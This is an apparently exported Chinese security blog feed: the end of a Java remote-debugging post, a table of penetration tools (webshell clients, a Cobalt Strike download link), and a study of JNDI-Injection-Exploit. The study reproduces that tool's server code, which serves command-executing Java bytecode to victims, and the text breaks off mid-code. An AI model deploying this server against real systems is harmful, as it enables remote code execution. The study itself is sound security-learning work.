-Xrunjdwp:transport=dt_socket,address=5005,suspend=n,server=y"</span></span><br></pre></td></tr></table></figure><h4 id="场景二：weblogic漏洞调试分析，直接用docker镜像进行分析，将用到的jar拷贝到本地"><a href="#场景二：weblogic漏洞调试分析，直接用docker镜像进行分析，将用到的jar拷贝到本地" class="headerlink" title="场景二：weblogic漏洞调试分析，直接用docker镜像进行分析，将用到的jar拷贝到本地"></a>场景二：weblogic漏洞调试分析，直接用docker镜像进行分析，将用到的jar拷贝到本地</h4><p>这里不在本文详细说明，参考<a href="https://www.cnblogs.com/ph4nt0mer/p/11772709.html" target="_blank" rel="noopener">IDEA+docker，进行远程漏洞调试（weblogic）</a>即可，我们需要知道的是遇到这种大型中间件等思路都是类似的：</p><ol><li>找到开启他们远程调试的方法，一般是在启动脚本中某个debug参数进行修改</li><li>保证外部开启这个容器的对应端口和对应环境</li><li>本地IDEA：在一个项目中将容器内的相关jar包都拷贝出来作为libraries</li><li>IDEA配置远程调试IVM信息，打上断点连接remote JVM</li></ol><p>参考链接：</p><p><a href="https://www.jetbrains.com/help/idea/debugging-code.html" target="_blank" rel="noopener">IntelliJ IDEA Debug code</a></p><p><a href="https://developer.ibm.com/zh/articles/j-lo-jpda1/" target="_blank" rel="noopener">JPDA 体系概览</a></p><p><a href="https://cloud.tencent.com/developer/article/1532856" target="_blank" rel="noopener">Java远程调试（Remote Debugging）的那些事</a></p><p><a href="https://www.baeldung.com/java-application-remote-debugging" target="_blank" rel="noopener">Java Application Remote Debugging</a></p><p><a href="https://www.cnblogs.com/ph4nt0mer/p/11772709.html" target="_blank" rel="noopener">IDEA+docker，进行远程漏洞调试（weblogic）</a></p>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> 调试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 调试方法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透常用工具汇总</title>
      <link href="2020/08/26/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/"/>
      <url>2020/08/26/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<p>渗透常用工具汇总</p><table><thead><tr><th>名称</th><th>标签</th><th>链接</th></tr></thead><tbody><tr><td>Nmap</td><td>信息收集-端口扫描</td><td><a href="https://github.com/nmap/nmap" target="_blank" rel="noopener">https://github.com/nmap/nmap</a><br><a href="https://www.wangan.com/docs/1205" target="_blank" rel="noopener">https://www.wangan.com/docs/1205</a></td></tr><tr><td>FOFA</td><td>信息收集</td><td><a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></td></tr><tr><td>subDomainsBrute</td><td>信息收集-子域名扫描</td><td><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></td></tr><tr><td>DirBuster</td><td>信息收集-目录扫描</td><td>[<a href="https://sourceforge.net/projects/dirbuster/files/DirBuster%20%28jar%20%2B%20lists%29/]" target="_blank" rel="noopener">https://sourceforge.net/projects/dirbuster/files/DirBuster%20%28jar%20%2B%20lists%29/]</a>(<a href="https://sourceforge.net/projects/dirbuster/files/DirBuster" target="_blank" rel="noopener">https://sourceforge.net/projects/dirbuster/files/DirBuster</a> (jar %2B lists)/)</td></tr><tr><td>WAFW00F</td><td>信息收集-WAF检测</td><td><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></td></tr><tr><td>IoTSeeker</td><td>信息收集-物联网设备</td><td><a href="https://github.com/rapid7/IoTSeeker" target="_blank" rel="noopener">https://github.com/rapid7/IoTSeeker</a></td></tr><tr><td>Webshell合集</td><td>Webshell</td><td><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></td></tr><tr><td>WebShell检测工具合集</td><td>WebShell检测工具</td><td><a href="https://mp.weixin.qq.com/s?__biz=MzIyMDEzMTA2MQ==&mid=2651152734&idx=2&sn=c1a085ee0465ee1ffa9f56dd251c2d26&chksm=8c217ac4bb56f3d270df89a386a1bfcb93bcf0187a380a70e88faf17eebff1e97dc09d53768b&mpshare=1&scene=1&srcid=0826v7aRv6XunTpDeHnoMfTb&sharer_sharetime=1598423051345&sharer_shareid=2574a941f983b8b408c85c7df640fdf1&key=6def13d9b1a9ecc5f3f714a0d7351036b30da95d63a13545a7137ac765603c4d0f5ace569cdc88dda371d9832dc75e712f16d03add7d16287afa76bd88977d6e41890c61e025798c9dfb6fae9198a1eafd61aae1432f83926f9d96a04f77e360e57c35138920468d37e060275eb71b834950d40c633f73a1f1ed778853519af5&ascene=1&uin=MjM0MDQ4ODMwMQ%3D%3D&devicetype=Windows+10+x64&version=62090529&lang=zh_CN&exportkey=Abm0dlYanJ4%2FVVeP%2BI1AMrs%3D&pass_ticket=eJHmOrDoSx0NOLP%2B0lWme6T%2BLXrwxq%2BvDYbCysREy%2FGiyobd7i%2BkEIyeWEmXvRaj" target="_blank" rel="noopener">10款常见的Webshell检测工具</a></td></tr><tr><td>中国蚁剑</td><td>WebShell连接工具/网站管理工具</td><td><a href="https://github.com/pycharming/antSword" target="_blank" rel="noopener">https://github.com/pycharming/antSword</a></td></tr><tr><td>冰蝎</td><td>WebShell连接工具/网站管理工具</td><td><a href="https://github.com/rebeyond/Behinder/releases/tag/Behinder_v3.0_Beta_5" target="_blank" rel="noopener">https://github.com/rebeyond/Behinder/releases/tag/Behinder_v3.0_Beta_5</a></td></tr><tr><td>菜刀</td><td>WebShell连接工具/网站管理工具</td><td></td></tr><tr><td>SqlMap</td><td>漏洞探测-SQL注入</td><td><a href="https://www.wangan.com/docs/1069" target="_blank" rel="noopener">https://www.wangan.com/docs/1069</a><br><a href="https://www.freebuf.com/sectool/164608.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/164608.html</a></td></tr><tr><td>MetaSploit</td><td>渗透框架</td><td></td></tr><tr><td>Cobalt Strike</td><td>渗透框架</td><td><a href="https://xz.aliyun.com/t/3975" target="_blank" rel="noopener">https://xz.aliyun.com/t/3975</a><br><a href="https://pan.baidu.com/s/1oJPRfh6-2oOUUKJAF0I2_A" target="_blank" rel="noopener">https://pan.baidu.com/s/1oJPRfh6-2oOUUKJAF0I2_A</a>  提取码：3drd<br><a href="https://www.freebuf.com/company-information/167460.html" target="_blank" rel="noopener">https://www.freebuf.com/company-information/167460.html</a></td></tr><tr><td>Wfuzz</td><td>FUZZ工具</td><td><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDI-Injection-Exploit工具代码简单学习</title>
      <link href="2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/08/12/JNDI%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近在学习webLogic、Jackson漏洞的过程中用到了很多次<a href="https://github.com/welk1n/JNDI-Injection-Exploit/" target="_blank" rel="noopener">JNDI-Injection-Exploit</a>工具，出于好奇学习了下内部代码。</p><h2 id="0x01-一些基础知识"><a href="#0x01-一些基础知识" class="headerlink" title="0x01 一些基础知识"></a>0x01 一些基础知识</h2><h2 id="0x02-结合代码深入学习"><a href="#0x02-结合代码深入学习" class="headerlink" title="0x02 结合代码深入学习"></a>0x02 结合代码深入学习</h2><p>从程序入口开始，按照目录依次分析</p><ol><li>run：ServerStart.java 开启整个JNDI服务</li><li>util：Mapper.java；Reflections.java；Transformers.java  通用的工具</li><li>jetty：JettyServer.java 开启HTTP相关服务</li><li>jndi：LDAPRefServer,java；RMIRefServer.java 开启RMI、LDAP服务</li></ol><img src="/imgs/image-20200813144416117.png" alt="image-20200813144416117" align='left'/><h3 id="run：ServerStart-java"><a href="#run：ServerStart-java" class="headerlink" title="run：ServerStart.java"></a>run：ServerStart.java</h3><p>ServerStart.java很简单明了，就是根据IP、命令、默认设置的端口开启HTTP、RMI、LDAP服务，并记录输出日志信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServerStart</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String addr = getLocalIpByNetcard();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//default ports</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> rmiPort = <span class="number">1099</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> ldapPort = <span class="number">1389</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> jettyPort = <span class="number">8180</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> JettyServer jettyServer;</span><br><span class="line">    <span class="keyword">private</span> RMIRefServer rmiRefServer;</span><br><span class="line">    <span class="keyword">private</span> LDAPRefServer ldapRefServer;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        CommandLineParser parser = new DefaultParser();</span></span><br><span class="line"><span class="comment">//        CommandLine cmd = null;</span></span><br><span class="line"><span class="comment">//        //default command</span></span><br><span class="line"><span class="comment">//        String[] cmdArray = &#123;"open","/Applications/Calculator.app"&#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        try&#123;</span></span><br><span class="line"><span class="comment">//            cmd = parser.parse(cmdlineOptions(),args);</span></span><br><span class="line"><span class="comment">//        &#125;catch (Exception e)&#123;</span></span><br><span class="line"><span class="comment">//            System.err.println("Cmdlines parse failed.");</span></span><br><span class="line"><span class="comment">//            System.exit(1);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        if(cmd.hasOption("C")) &#123;</span></span><br><span class="line"><span class="comment">//            cmdArray = cmd.getOptionValues('C');</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        if(cmd.hasOption("A")) &#123;</span></span><br><span class="line"><span class="comment">//            addr = cmd.getOptionValue('A');</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        String cmdArray = <span class="string">"calc"</span>;</span><br><span class="line">        addr = <span class="string">"192.168.116.1"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据IP、端口、命令开启http、rmi、ldap服务</span></span><br><span class="line">        ServerStart servers = <span class="keyword">new</span> ServerStart(<span class="keyword">new</span> URL(<span class="string">"http://"</span>+ addr +<span class="string">":"</span>+ jettyPort +<span class="string">"/"</span>),StringUtils.join(cmdArray,<span class="string">" "</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 日志信息</span></span><br><span class="line">        System.out.println(<span class="string">"[ADDRESS] &gt;&gt; "</span> + addr);</span><br><span class="line">        System.out.println(<span class="string">"[COMMAND] &gt;&gt; "</span> + withColor(StringUtils.join(cmdArray,<span class="string">" "</span>),ANSI_BLUE));</span><br><span class="line">        Class.forName(<span class="string">"util.Mapper"</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"----------------------------Server Log----------------------------"</span>);</span><br><span class="line">        System.out.println(getLocalTime() + <span class="string">" [JETTYSERVER]&gt;&gt; Listening on 0.0.0.0:"</span> + jettyPort);</span><br><span class="line">        Thread threadJetty = <span class="keyword">new</span> Thread(servers.jettyServer);</span><br><span class="line">        threadJetty.start();</span><br><span class="line"></span><br><span class="line">        System.out.println(getLocalTime() + <span class="string">" [RMISERVER]  &gt;&gt; Listening on 0.0.0.0:"</span> + rmiPort);</span><br><span class="line">        Thread threadRMI = <span class="keyword">new</span> Thread(servers.rmiRefServer);</span><br><span class="line">        threadRMI.start();</span><br><span class="line"></span><br><span class="line">        Thread threadLDAP = <span class="keyword">new</span> Thread(servers.ldapRefServer);</span><br><span class="line">        threadLDAP.start();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ServerStart</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.codebase = <span class="keyword">new</span> URL(<span class="string">"http://"</span>+ getLocalIpByNetcard() +<span class="string">":"</span>+ jettyPort +<span class="string">"/"</span>);</span><br><span class="line"></span><br><span class="line">        jettyServer = <span class="keyword">new</span> JettyServer(jettyPort,cmd);</span><br><span class="line">        rmiRefServer = <span class="keyword">new</span> RMIRefServer(rmiPort, codebase, cmd);</span><br><span class="line">        ldapRefServer = <span class="keyword">new</span> LDAPRefServer(ldapPort,codebase);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据IP、命令、默认设置的端口，创建HTTP、RMI、LDAP服务</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ServerStart</span><span class="params">(URL codebase, String cmd)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.codebase = codebase;</span><br><span class="line"></span><br><span class="line">        jettyServer = <span class="keyword">new</span> JettyServer(jettyPort,cmd);</span><br><span class="line">        rmiRefServer = <span class="keyword">new</span> RMIRefServer(rmiPort, codebase, cmd);</span><br><span class="line">        ldapRefServer = <span class="keyword">new</span> LDAPRefServer(ldapPort,<span class="keyword">this</span>.codebase);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  命令行获取IP和执行命令信息</span></span><br><span class="line"><span class="comment">     *  Option是Apache 下面的一个解析命令行输入的工具包</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Options <span class="title">cmdlineOptions</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Options opts = <span class="keyword">new</span> Options();</span><br><span class="line">        <span class="comment">// 定义参数选项命令信息 -C</span></span><br><span class="line">        Option c = <span class="keyword">new</span> Option(<span class="string">"C"</span>,<span class="keyword">true</span>,<span class="string">"The command executed in remote .class."</span>);</span><br><span class="line">        c.setArgs(Option.UNLIMITED_VALUES);</span><br><span class="line">        opts.addOption(c);</span><br><span class="line">        <span class="comment">// 定义参数选项IP信息 -A</span></span><br><span class="line">        Option addr = <span class="keyword">new</span> Option(<span class="string">"A"</span>,<span class="keyword">true</span>,<span class="string">"The address of server(ip or domain)."</span>);</span><br><span class="line">        opts.addOption(addr);</span><br><span class="line">        <span class="keyword">return</span> opts;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 直接根据第一个网卡地址作为其内网ipv4地址</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getLocalIpByNetcard</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (Enumeration&lt;NetworkInterface&gt; e = NetworkInterface.getNetworkInterfaces(); e.hasMoreElements(); ) &#123;</span><br><span class="line">                NetworkInterface item = e.nextElement();</span><br><span class="line">                <span class="keyword">for</span> (InterfaceAddress address : item.getInterfaceAddresses()) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (item.isLoopback() || !item.isUp()) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (address.getAddress() <span class="keyword">instanceof</span> Inet4Address) &#123;</span><br><span class="line">                        Inet4Address inet4Address = (Inet4Address) address.getAddress();</span><br><span class="line">                        <span class="keyword">return</span> inet4Address.getHostAddress();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> InetAddress.getLocalHost().getHostAddress();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get current time</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getLocalTime</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Date d = <span class="keyword">new</span> Date();</span><br><span class="line">        DateFormat sdf = <span class="keyword">new</span> SimpleDateFormat(<span class="string">"yyyy-MM-dd HH:mm:ss"</span>);</span><br><span class="line">        <span class="keyword">return</span> sdf.format(d);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Boolean <span class="title">isLinux</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> !System.getProperty(<span class="string">"os.name"</span>).toLowerCase().startsWith(<span class="string">"win"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">withColor</span><span class="params">(String str,String color)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (isLinux()) &#123;</span><br><span class="line">            <span class="keyword">return</span> color + str + ANSI_RESET;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Util"><a href="#Util" class="headerlink" title="Util"></a>Util</h3><p>Mapper很明了，主要是用来输出提示，告知用户相关信息</p><p><img src="/imgs/image-20200813201605598.png" alt="image-20200813201605598"></p><h4 id="Transformers-动态生成执行命令的字节码"><a href="#Transformers-动态生成执行命令的字节码" class="headerlink" title="Transformers-动态生成执行命令的字节码"></a>Transformers-动态生成执行命令的字节码</h4><p>Transformers主要用ASM来动态生成执行命令的字节码，便于实现远程服务器从HTTP服务器获取class来执行命令。</p><p>ASM是一个Java字节码操纵框架，被用来<strong>动态生成类</strong>或者增强既有类的功能。所以它能灵活地根据输入的参数插入到类模板，从而实现执行任何命令需求。</p><p>ASM的核心API：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ClassReader：用于读取已经编译好的.class文件。</span><br><span class="line">ClassWriter：用于重新构建编译后的类，如修改类名、属性以及方法，也可以生成新的类的字节码文件。</span><br><span class="line">各种Visitor类：ASM内部采用访问者模式根据字节码从上到下依次处理，对于字节码文件中不同的区域有不同的Visitor。用于访问方法的MethodVisitor、用于访问类变量的FieldVisitor、用于访问注解的AnnotationVisitor等。为了实现AOP，重点要使用的是MethodVisitor。</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20200813171228268.png" alt="image-20200813171228268"></p><h3 id="jetty：JettyServer-java"><a href="#jetty：JettyServer-java" class="headerlink" title="jetty：JettyServer.java"></a>jetty：JettyServer.java</h3><p>JettyServe用于开启HTTP服务，主要是提供远程服务器class字节码，这个字节码由Transformers根据请求的是JDK7还是JDK8的模板来生成执行命令的class字节码，从而动态执行命令</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Classname</span> JettyServer</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span> HTTPServer supply .class file which execute command by Runtime.getRuntime.exec()</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> welkin</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Jetty是一个提供 HTTP服务器、HTTP客户端和javax.servlet容器的开源项目</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JettyServer</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> port;</span><br><span class="line">    <span class="keyword">private</span> Server server;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String command;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public JettyServer(int port) &#123;</span></span><br><span class="line"><span class="comment">//        this.port = port;</span></span><br><span class="line"><span class="comment">//        server = new Server(port);</span></span><br><span class="line"><span class="comment">//        command = "open /Applications/Calculator.app";</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">JettyServer</span><span class="params">(<span class="keyword">int</span> port,String cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.port = port;</span><br><span class="line">        server = <span class="keyword">new</span> Server(port);</span><br><span class="line">        command = cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ServletHandler handler = <span class="keyword">new</span> ServletHandler();</span><br><span class="line">        server.setHandler(handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理器 DownloadServlet 处理所有路径/*</span></span><br><span class="line">        handler.addServletWithMapping(DownloadServlet.class, "/*");</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            server.start();</span><br><span class="line">            server.join();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings</span>(<span class="string">"serial"</span>)</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">DownloadServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 根据RequestURI，获取到相应的类模板</span></span><br><span class="line">            String filename = request.getRequestURI().substring(<span class="number">1</span>);</span><br><span class="line">            InputStream in = checkFilename(filename);</span><br><span class="line">            <span class="keyword">byte</span>[] transformed;</span><br><span class="line">            ByteArrayInputStream bain = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 传入模板和命令，用Transformers生成执行命令的字节流</span></span><br><span class="line">                    transformed = insertCommand(in,command);</span><br><span class="line">                    bain = <span class="keyword">new</span> ByteArrayInputStream(transformed);</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    System.out.println(getLocalTime() + <span class="string">" [JETTYSERVER]&gt;&gt; Byte array build failed."</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                System.out.println(getLocalTime() + <span class="string">" 